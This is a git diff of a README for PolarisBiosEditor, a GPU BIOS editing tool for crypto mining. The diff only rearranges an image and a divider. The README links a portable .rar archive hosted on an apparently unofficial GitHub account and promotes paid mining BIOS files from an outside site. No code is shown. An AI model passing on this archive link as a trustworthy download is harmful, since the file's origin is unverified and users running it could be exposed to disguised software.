@@ -1,12 +1,10 @@
 # PolarisBiosEditor (PBE 1.6.7, 1.7.0, 1.7.6, 3 PRO): Download for Windows/Linux/MacOS
 
------------------------------------------------------------------------------------------------------------------
-![image](https://user-images.githubusercontent.com/98729987/212367484-718fe836-2feb-44a9-80fe-57efe1fb668b.png)
-
 [Download Polaris Bios Editor for Windows/Linux/MacOS](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor-portable.rar)
 -----------------------------------------------------------------------------------------------------------------
-
-## Buy mining bios with performance timings! https://mining-bios.eu/
+![image](https://user-images.githubusercontent.com/98729987/212367484-718fe836-2feb-44a9-80fe-57efe1fb668b.png)
+-----------------------------------------------------------------------------------------------------------------
+### Buy mining bios with performance timings! https://mining-bios.eu/
 **Polaris Bios Editor 3 PRO https://mining-bios.eu/product/polaris-bios-editor-3-pro-pbe-3-pro-performance-timings/**
 
 Bios mod guide: https://bitcointalk.org/index.php?topic=1954245.0
